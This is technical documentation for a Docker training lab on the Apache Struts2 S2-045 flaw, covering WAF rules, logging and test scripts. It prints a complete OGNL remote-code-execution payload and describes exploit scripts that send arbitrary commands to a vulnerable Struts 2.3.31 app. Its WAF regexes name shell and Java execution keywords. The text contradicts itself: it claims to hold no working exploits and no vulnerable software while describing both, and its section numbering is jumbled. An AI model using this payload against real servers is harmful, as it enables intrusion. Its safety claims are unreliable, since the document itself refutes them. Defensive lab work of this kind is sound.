# Technical Documentation: S2-045 Defense Lab

## Executive Summary

This document provides an in-depth technical explanation of the Docker-based security lab designed to demonstrate **defense and detection** mechanisms against Apache Struts2 S2-045 (CVE-2017-5638) class attacks. The lab is intentionally designed to contain **no working exploits** while providing realistic defense training.

---

## Table of Contents

1. [Background: What is S2-045?](#1-background-what-is-s2-045)
2. [Architecture Overview](#2-architecture-overview)
3. [Component Deep Dive](#3-component-deep-dive)
4. [Defense Mechanisms](#4-defense-mechanisms)
5. [Logging Strategy](#5-logging-strategy)
6. [Attack Pattern Simulator](#6-attack-pattern-simulator)
7. [Security Considerations](#7-security-considerations)
8. [Design Decisions](#8-design-decisions)

---

## 1. Background: What is S2-045?

### The Vulnerability

CVE-2017-5638, known as "S2-045", was a critical Remote Code Execution (RCE) vulnerability in Apache Struts2 discovered in March 2017.

**Affected Versions:**
- Struts 2.3.5 through 2.3.31
- Struts 2.5 through 2.5.10

**Root Cause:**
The Jakarta Multipart parser in Struts2 improperly handled the `Content-Type` HTTP header. When processing multipart requests, the parser would evaluate OGNL (Object-Graph Navigation Language) expressions embedded in error messages generated from malformed Content-Type headers.

**Attack Vector:**
```
POST /vulnerable-app/action HTTP/1.1
Content-Type: %{malicious_ognl_expression}
```

The parser would attempt to process the malformed Content-Type, generate an error message containing the original header value, and then evaluate any OGNL expressions within that error message—leading to arbitrary code execution on the server.

### Vulnerability Mechanism: Deep Dive

#### Step 1: Multipart Request Processing

When Struts2 receives a `multipart/form-data` request, the `JakartaMultiPartRequest` class processes it:

```java
// Simplified vulnerable code (Struts 2.3.31)
public void parse(HttpServletRequest request, String saveDir) throws IOException {
    String contentType = request.getContentType();
    // Extract boundary from Content-Type header
    String boundary = extractBoundary(contentType);
    // Parse multipart body...
}
```

#### Step 2: Error Handling Vulnerability

In vulnerable versions, when parsing fails, the error handling constructs a message:

```java
// VULNERABLE CODE PATTERN (conceptual)
try {
    String boundary = extractBoundary(contentType);
    // ... parsing logic ...
} catch (Exception e) {
    // VULNERABILITY: User input directly interpolated into error message
    String errorMsg = "Invalid Content-Type: " + contentType;
    // Error message is then processed by OGNL evaluator
    throw new RuntimeException(errorMsg);
}
```

**The Critical Flaw**: The `contentType` variable contains user-controlled input from the HTTP header. If this input contains OGNL expressions like `%{...}`, these expressions are evaluated when the error message is processed.

#### Step 3: OGNL Expression Evaluation

OGNL (Object-Graph Navigation Language) is a powerful expression evaluator used by Struts2. When error messages are processed, OGNL expressions can be evaluated:

```ognl
%{
  (#_='multipart/form-data').
  (#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).
  (#_memberAccess?(#_memberAccess=#dm):(
    (#container=#context['com.opensymphony.xwork2.ActionContext.container']).
    (#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).
    (#ognlUtil.getExcludedPackageNames().clear()).
    (#ognlUtil.getExcludedClasses().clear()).
    (#context.setMemberAccess(#dm))
  )).
  (#cmd='whoami').
  (#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).
  (#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/bash','-c',#cmd})).
  (#p=new java.lang.ProcessBuilder(#cmds)).
  (#p.redirectErrorStream(true)).
  (#process=#p.start()).
  (#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).
  (@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).
  (#ros.flush())
}
```

This payload:
1. Bypasses OGNL security restrictions
2. Constructs a system command
3. Executes the command via `ProcessBuilder`
4. Writes output to HTTP response stream

#### Step 4: Command Execution

The OGNL expression executes arbitrary Java code, including:
- System command execution (`Runtime.exec()`, `ProcessBuilder`)
- File system access
- Network operations
- Arbitrary method invocation

### Vulnerable vs Patched Comparison

This lab includes **both** a vulnerable and a patched version for comparison:

| Aspect | Vulnerable (Struts 2.3.31) | Patched (Struts 6.3.0.2) |
|--------|----------------------------|--------------------------|
| **Location** | `app-vulnerable/` | `app/` |
| **Port** | 127.0.0.1:8081 | Internal (via nginx:8080) |
| **Multipart Parser** | Jakarta Commons FileUpload 1.3.3 | Commons FileUpload2 2.0.0-M2 |
| **Error Handling** | OGNL evaluation in error messages | No OGNL evaluation |
| **OGNL Security** | Weak restrictions, bypassable | Strong restrictions, not bypassable |
| **WAF Protection** | None | Nginx WAF rules |
| **Exploitable** | ✅ Yes (demonstrated) | ❌ No |

#### Key Differences in Code

**Vulnerable Version (`app-vulnerable/`):**
- Uses `org.apache.struts2.dispatcher.ng.filter.StrutsPrepareAndExecuteFilter`
- Minimal error handling
- No input validation
- OGNL expressions in error messages are evaluated

**Patched Version (`app/`):**
- Uses `org.apache.struts2.dispatcher.filter.StrutsPrepareAndExecuteFilter`
- Secure error handling (no OGNL evaluation)
- Input validation and sanitization
- Comprehensive security logging

### Why This Lab Includes Both Versions

1. **Educational Value**: Demonstrates the vulnerability mechanism in action
2. **Comparison**: Shows how patching and defense mechanisms prevent exploitation
3. **Exploitation Training**: Allows hands-on exploitation practice in a safe environment
4. **Defense Training**: Shows how WAF and other defenses block attacks

The goal is to provide **complete understanding** of both exploitation and defense.

---

## 2. Architecture Overview

### System Topology

```
┌─────────────────────────────────────────────────────────────────────────┐
│                          HOST MACHINE                                    │
│                     (127.0.0.1 binding only)                            │
│                                                                         │
│  ┌──────────────────┐                                                   │
│  │    Simulator     │ ─── Sends test requests ───┐                      │
│  │   (Alpine/curl)  │                            │                      │
│  └──────────────────┘                            ▼                      │
│                                         ┌──────────────────┐            │
│                                         │      NGINX       │            │
│                                         │  Reverse Proxy   │            │
│                      Port 8080 ◄────────│  + WAF Rules     │            │
│                      localhost          │  + Rate Limit    │            │
│                                         └────────┬─────────┘            │
│                                                  │                      │
│                                    Docker Network (internal)            │
│                                                  │                      │
│                                                  ▼                      │
│                                         ┌──────────────────┐            │
│                                         │     TOMCAT 10    │            │
│                                         │  + Struts 6.3.x  │            │
│                                         │  (NOT VULNERABLE)│            │
│                                         └──────────────────┘            │
│                                                                         │
│  ┌─────────────────────────────────────────────────────────────────┐   │
│  │                     Mounted Volumes                              │   │
│  │  ./logs/nginx/  ←── access.log, error.log                       │   │
│  │  ./logs/app/    ←── struts-lab.log, security.log, audit.log     │   │
│  └─────────────────────────────────────────────────────────────────┘   │
└─────────────────────────────────────────────────────────────────────────┘
```

### Container Roles

| Container | Image Base | Purpose | Exposed Ports |
|-----------|-----------|---------|---------------|
| `nginx` | nginx:1.25-alpine | Reverse proxy, WAF, rate limiting | 127.0.0.1:8080 |
| `app` | tomcat:10.1-jdk17 | Struts2 application server | Internal only |
| `simulator` | alpine:3.19 | Test request generator | None |

### Network Configuration

```yaml
networks:
  struts-lab-net:
    driver: bridge
    ipam:
      config:
        - subnet: 172.28.0.0/16
```

All inter-container communication occurs on this private Docker network. Only nginx exposes a port, and it's bound exclusively to `127.0.0.1`.

---

## 3. Component Deep Dive

### 3.1 Nginx Reverse Proxy

**File:** `nginx/nginx.conf`

The nginx configuration implements multiple security layers:

#### Rate Limiting

```nginx
limit_req_zone $binary_remote_addr zone=req_limit:10m rate=10r/s;
limit_req zone=req_limit burst=20 nodelay;
```

- **Zone:** 10MB shared memory for tracking IPs
- **Rate:** 10 requests per second per IP
- **Burst:** Allows 20 request burst without delay
- **Status:** Returns HTTP 429 when exceeded

#### Request Size Limits

```nginx
client_max_body_size 10m;           # Max upload: 10MB
client_body_buffer_size 128k;       # Body buffer
large_client_header_buffers 4 8k;   # Header limit: 4 × 8KB = 32KB total
```

These limits prevent:
- Large payload attacks
- Header-based buffer overflow attempts
- Resource exhaustion via oversized requests

#### WAF Pattern Detection

The core S2-045 detection logic uses nginx's `if` directive with regex matching:

```nginx
# Pattern 1: Expression language markers
if ($content_type ~* "(\%\{|\$\{|\#\{)") {
    set $waf_block 1;
}

# Pattern 2: Java class references
if ($content_type ~* "(java\.|javax\.|com\.opensymphony)") {
    set $waf_block 1;
}

# Pattern 3: Dangerous keywords
if ($content_type ~* "(getRuntime|ProcessBuilder|exec\(|cmd\.exe|/bin/)") {
    set $waf_block 1;
}
```

When `$waf_block = 1`, the request is immediately rejected with HTTP 403.

#### Custom Logging Format

```nginx
log_format security '$remote_addr - $remote_user [$time_local] '
                    '"$request" $status $body_bytes_sent '
                    'req_id="$request_id" '
                    'content_type="$content_type" '
                    'request_time="$request_time"';
```

This format includes:
- Unique request ID for correlation
- Full Content-Type header (key for S2-045 analysis)
- Request timing for performance analysis

### 3.2 Struts2 Application

**Directory:** `app/struts-app/`

#### Maven Project Structure

```
struts-app/
├── pom.xml                 # Dependencies + build config
└── src/main/
    ├── java/com/lab/struts/action/
    │   ├── UploadAction.java      # File upload handler
    │   └── HealthAction.java      # Health check endpoint
    ├── resources/
    │   ├── struts.xml             # Action mappings
    │   └── log4j2.xml             # Logging configuration
    └── webapp/
        ├── WEB-INF/web.xml        # Servlet configuration
        └── *.jsp                  # View templates
```

#### Key Dependencies (pom.xml)

```xml
<!-- Struts 6.3.x - PATCHED VERSION -->
<dependency>
    <groupId>org.apache.struts</groupId>
    <artifactId>struts2-core</artifactId>
    <version>6.3.0.2</version>
</dependency>

<!-- Modern file upload (not vulnerable Jakarta parser) -->
<dependency>
    <groupId>org.apache.commons</groupId>
    <artifactId>commons-fileupload2-jakarta-servlet6</artifactId>
    <version>2.0.0-M2</version>
</dependency>
```

#### UploadAction.java - Security Features

The upload action implements defense-in-depth:

**1. Request ID Tracking:**
```java
requestId = request.getHeader("X-Request-ID");
if (requestId == null) {
    requestId = UUID.randomUUID().toString().substring(0, 8);
}
```

**2. Comprehensive Metadata Logging:**
```java
private void logRequestMetadata() {
    StringBuilder headerLog = new StringBuilder();
    headerLog.append("[REQUEST] ID=").append(requestId);
    headerLog.append(" Method=").append(request.getMethod());
    headerLog.append(" Content-Type=").append(contentType);
    logger.info(headerLog.toString());
}
```

**3. Secondary Content-Type Validation (Defense in Depth):**
```java
private boolean isSuspiciousContentType(String contentType) {
    String lower = contentType.toLowerCase();
    return lower.contains("${") ||
           lower.contains("%{") ||
           lower.contains("#{") ||
           lower.contains("java.") ||
           lower.contains("runtime");
}
```

Even though nginx should block these, the app validates again.

**4. Path Traversal Prevention:**
```java
if (uploadFileName.contains("..") || 
    uploadFileName.contains("/") || 
    uploadFileName.contains("\\")) {
    securityLogger.warn("[SECURITY] Path traversal attempt: {}", filename);
    return false;
}
```

**5. Log Injection Prevention:**
```java
private String sanitizeForLog(String input) {
    return input.replaceAll("[\\r\\n\\t]", " ")
                .substring(0, Math.min(input.length(), 200));
}
```

#### Struts Configuration (struts.xml)

```xml
<!-- Security: Disable dangerous features -->
<constant name="struts.enable.DynamicMethodInvocation" value="false"/>
<constant name="struts.devMode" value="false"/>

<!-- File upload limits -->
<constant name="struts.multipart.maxSize" value="10485760"/>
<constant name="struts.multipart.maxFiles" value="5"/>

<!-- Allowed file types -->
<param name="fileUpload.allowedTypes">
    text/plain,application/pdf,image/jpeg,image/png
</param>
```

### 3.3 Multi-Stage Docker Build

**File:** `app/Dockerfile`

```dockerfile
# Stage 1: Build with Maven
FROM maven:3.9-eclipse-temurin-17 AS builder
WORKDIR /build
COPY struts-app/pom.xml .
RUN mvn dependency:go-offline -B    # Cache dependencies
COPY struts-app/src ./src
RUN mvn clean package -DskipTests -B

# Stage 2: Runtime with Tomcat
FROM tomcat:10.1-jdk17-temurin-jammy
RUN rm -rf /usr/local/tomcat/webapps/*
COPY --from=builder /build/target/struts-lab.war /usr/local/tomcat/webapps/

# Security: Run as non-root
RUN useradd -r -g tomcat tomcat
USER tomcat
```

Benefits:
- **Smaller image:** Build tools not in runtime image
- **Layer caching:** Dependencies cached separately from source
- **Non-root execution:** Reduced privilege escalation risk

---

## 4. Defense Mechanisms

### 4.1 Defense in Depth Architecture

```
┌─────────────────────────────────────────────────────────────────────┐
│                      DEFENSE LAYERS                                  │
├─────────────────────────────────────────────────────────────────────┤
│                                                                      │
│  Layer 1: Network Isolation                                         │
│  ├── 127.0.0.1 binding only                                         │
│  └── Internal Docker network                                        │
│                                                                      │
│  Layer 2: Rate Limiting                                             │
│  ├── 10 req/s per IP                                                │
│  └── Burst allowance of 20                                          │
│                                                                      │
│  Layer 3: Request Size Limits                                       │
│  ├── 10MB body limit                                                │
│  └── 32KB header limit                                              │
│                                                                      │
│  Layer 4: WAF Pattern Detection                                     │
│  ├── Expression markers: %{ ${ #{                                   │
│  ├── Java class references                                          │
│  ├── Dangerous keywords: Runtime, ProcessBuilder                    │
│  └── Shell paths: /bin/bash, cmd.exe                                │
│                                                                      │
│  Layer 5: Application Validation                                    │
│  ├── Secondary Content-Type checks                                  │
│  ├── File type whitelist                                            │
│  └── Filename sanitization                                          │
│                                                                      │
│  Layer 6: Patched Framework                                         │
│  └── Struts 6.3.x (not vulnerable to S2-045)                       │
│                                                                      │
└─────────────────────────────────────────────────────────────────────┘
```

### 4.2 Pattern Detection Rules

| Pattern | Regex | Rationale |
|---------|-------|-----------|
| Expression markers | `(\%\{|\$\{|\#\{)` | OGNL/EL syntax used in exploits |
| Java packages | `(java\.|javax\.|com\.opensymphony)` | Class loading attempts |
| Runtime execution | `(getRuntime|ProcessBuilder)` | Code execution methods |
| Shell paths | `(/bin/bash|/bin/sh|cmd\.exe)` | Command execution targets |
| Encoding tricks | `(%00|%0a|%0d)` | Null byte/newline injection |

---

## 5. Logging Strategy

### 5.1 Log Categories

| Logger | File | Purpose |
|--------|------|---------|
| Application | `struts-lab.log` | General application events |
| Security | `security.log` | Suspicious activity, blocked requests |
| Audit | `audit.log` | All request metadata |
| Nginx Access | `access.log` | HTTP request log |
| Nginx Error | `error.log` | WAF blocks, errors |

### 5.2 Log Correlation

All logs include a **Request ID** that flows through the entire stack:

```
Nginx → X-Request-ID header → Application → All log entries
```

Example correlation:
```
# nginx/access.log
192.168.1.1 "POST /upload" 403 req_id="abc123" content_type="multipart;%{..."

# app/security.log
2024-01-15 10:30:45 [SECURITY] Request ID=abc123 - Suspicious Content-Type detected
```

### 5.3 Log4j2 Configuration Highlights

```xml
<!-- Separate security logger -->
<Logger name="SECURITY" level="INFO" additivity="false">
    <AppenderRef ref="SecurityLog"/>
    <AppenderRef ref="Console"/>
</Logger>

<!-- Rolling file with retention -->
<RollingFile name="SecurityLog" fileName="${logPath}/security.log">
    <Policies>
        <TimeBasedTriggeringPolicy interval="1"/>
        <SizeBasedTriggeringPolicy size="10 MB"/>
    </Policies>
    <DefaultRolloverStrategy max="30"/>
</RollingFile>
```

---

## 6. Attack Pattern Simulator

### 6.1 Purpose

The simulator (`simulator/simulate.sh`) sends HTTP requests that **pattern-match** S2-045 attack signatures without containing actual exploit payloads. This allows testing of detection mechanisms safely.

### 6.2 Test Categories

#### Baseline Tests (Should Pass)
```bash
# Health check
curl http://nginx/struts-lab/health

# Legitimate file upload
curl -F "upload=@test.txt" http://nginx/struts-lab/upload
```

#### WAF Tests (Should Be Blocked)
```bash
# Expression marker in Content-Type
curl -H "Content-Type: multipart/form-data; %{test}" ...

# Java class reference
curl -H "Content-Type: multipart/form-data; java.lang.String" ...

# Shell path
curl -H "Content-Type: multipart/form-data; /bin/bash" ...
```

### 6.3 What the Simulator Does NOT Contain

❌ No OGNL expressions  
❌ No actual exploit payloads  
❌ No command injection attempts  
❌ No working RCE code  

The patterns are **syntactically similar** to attack signatures but semantically meaningless.

---

## 7. Vulnerable Application Implementation

### 7.1 Purpose

The vulnerable application (`app-vulnerable/`) demonstrates the actual S2-045 vulnerability using Struts 2.3.31. This allows hands-on exploitation practice and comparison with the patched defense lab.

### 7.2 Technical Differences

#### Struts Version
- **Vulnerable**: Struts 2.3.31 (last vulnerable 2.3.x version)
- **Patched**: Struts 6.3.0.2

#### Dependencies

**Vulnerable (`app-vulnerable/struts-app/pom.xml`):**
```xml
<dependency>
    <groupId>org.apache.struts</groupId>
    <artifactId>struts2-core</artifactId>
    <version>2.3.31</version>
</dependency>
<dependency>
    <groupId>commons-fileupload</groupId>
    <artifactId>commons-fileupload</artifactId>
    <version>1.3.3</version>
</dependency>
```

**Patched (`app/struts-app/pom.xml`):**
```xml
<dependency>
    <groupId>org.apache.struts</groupId>
    <artifactId>struts2-core</artifactId>
    <version>6.3.0.2</version>
</dependency>
<dependency>
    <groupId>org.apache.commons</groupId>
    <artifactId>commons-fileupload2-jakarta-servlet6</artifactId>
    <version>2.0.0-M2</version>
</dependency>
```

#### Filter Class

**Vulnerable (`web.xml`):**
```xml
<filter-class>org.apache.struts2.dispatcher.ng.filter.StrutsPrepareAndExecuteFilter</filter-class>
```

**Patched (`web.xml`):**
```xml
<filter-class>org.apache.struts2.dispatcher.filter.StrutsPrepareAndExecuteFilter</filter-class>
```

Note: The package path changed from `dispatcher.ng` to `dispatcher` in newer versions.

### 7.3 Security Features Removed

The vulnerable application intentionally lacks:
- ❌ WAF protection
- ❌ Rate limiting
- ❌ Request size limits
- ❌ Input validation
- ❌ Security logging
- ❌ OGNL expression filtering

### 7.4 Deployment

The vulnerable app is exposed directly on port 8081 (no nginx proxy):

```yaml
app-vulnerable:
  ports:
    - "127.0.0.1:8081:8080"
```

This allows direct exploitation testing without WAF interference.

---

## 8. Exploitation Tools

### 8.1 Exploit Container

The `exploit/` container provides tools for demonstrating S2-045 exploitation:

**Contents:**
- `demo_exploit.sh`: Bash script with multiple exploitation tests
- `exploit.py`: Python script for custom command execution
- `Dockerfile`: Container with Python, curl, and bash

### 8.2 Exploit Script Structure

#### Bash Script (`demo_exploit.sh`)

The script performs:
1. **Vulnerability Check**: Verifies app is accessible
2. **Command Execution Tests**: 
   - `whoami` - Get current user
   - `id` - Get user/group IDs
   - `pwd` - Get working directory
   - `ls -la /tmp` - List directory contents

#### OGNL Payload Construction

The script builds OGNL payloads dynamically:

```bash
build_ognl_payload() {
    local command="$1"
    local encoded_command=$(echo -n "$command" | python3 -c "import sys, urllib.parse; print(urllib.parse.quote(sys.stdin.read()))")
    
    # Construct full OGNL payload
    echo "%{(#_='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS)...}"
}
```

#### Python Script (`exploit.py`)

Provides programmatic exploitation:

```python
def exploit(target_url: str, command: str) -> Optional[str]:
    payload = build_ognl_payload(command)
    headers = {'Content-Type': payload}
    files = {'upload': ('test.txt', b'')}
    response = requests.post(f"{target_url}/upload", headers=headers, files=files)
    return response.text
```

### 8.3 Exploitation Flow

1. **Target Identification**: Vulnerable app on port 8081
2. **Payload Construction**: Build OGNL expression with command
3. **Request Sending**: POST to `/upload` with malicious Content-Type
4. **Response Parsing**: Extract command output from response body
5. **Verification**: Confirm command execution succeeded

### 8.4 Expected Results

**Successful Exploitation:**
- HTTP 200 or 500 response
- Command output visible in response body
- No error about invalid Content-Type
- Process execution confirmed

**Failed Exploitation (Patched App):**
- HTTP 400/403 (blocked)
- HTTP 500 with no command output
- Error message about invalid request
- No process execution

---

## 9. Security Considerations

### 7.1 Lab Isolation

| Mechanism | Implementation |
|-----------|----------------|
| Localhost binding | `127.0.0.1:8080:80` in docker-compose |
| No public exposure | External port binding disabled |
| Internal network | Docker bridge network for inter-container |
| Non-root containers | `USER tomcat` in Dockerfile |

### 7.2 What This Lab Is

✅ Educational defense training  
✅ Log analysis practice  
✅ WAF rule development testing  
✅ Incident response simulation  

### 7.3 What This Lab Is NOT

❌ Penetration testing toolkit  
❌ Exploit development environment  
❌ Vulnerable application for CTF  
❌ Production security solution  

---

## 10. Design Decisions

### 8.1 Why Struts 6.3.x Instead of a Vulnerable Version?

1. **Legal/Ethical:** Distributing known-vulnerable software raises liability concerns
2. **Educational Focus:** Goal is defense, not exploitation
3. **Realistic:** Defenders typically work with patched systems
4. **Pattern Testing:** WAF rules are tested against patterns, not actual exploits

### 8.2 Why Nginx as WAF Instead of ModSecurity/Dedicated WAF?

1. **Simplicity:** Native nginx config, no additional modules
2. **Portability:** Works on any system with Docker
3. **Transparency:** Rules are visible and easily understood
4. **Lightweight:** Minimal resource footprint for laptop labs

### 8.3 Why Docker Compose Instead of Kubernetes?

1. **Accessibility:** Works on any laptop with Docker
2. **Simplicity:** Single command to start entire lab
3. **Resource Efficiency:** Minimal overhead
4. **Portability:** Easy to share and reproduce

### 8.4 Why File-Based Logging Instead of ELK/Splunk?

1. **Simplicity:** No additional infrastructure needed
2. **Learning:** Encourages manual log analysis skills
3. **Portability:** Logs accessible without additional tools
4. **Extensibility:** Easy to add log shippers later

---

## Appendix A: File Inventory

| File | Lines | Purpose |
|------|-------|---------|
| `docker-compose.yml` | 85 | Container orchestration |
| `nginx/nginx.conf` | 170 | Reverse proxy + WAF |
| `nginx/waf-rules.conf` | 85 | Pattern detection maps |
| `app/Dockerfile` | 55 | Multi-stage build |
| `app/struts-app/pom.xml` | 95 | Maven dependencies |
| `UploadAction.java` | 185 | Upload handler |
| `HealthAction.java` | 85 | Health endpoint |
| `struts.xml` | 75 | Action mappings |
| `log4j2.xml` | 105 | Logging config |
| `web.xml` | 55 | Servlet config |
| `simulate.sh` | 235 | Test script |
| **Total** | **~1,230** | Complete lab |

---

## Appendix B: Quick Reference

### Start Lab
```bash
docker-compose build
docker-compose up -d nginx app
```

### Run Tests
```bash
docker-compose run --rm simulator
```

### View Logs
```bash
tail -f logs/nginx/access.log
tail -f logs/app/security.log
```

### Cleanup
```bash
docker-compose down -v
rm -rf logs/
```

---

*Document Version: 1.0*  
*Last Updated: December 2024*  
*Author: Security Lab Team*

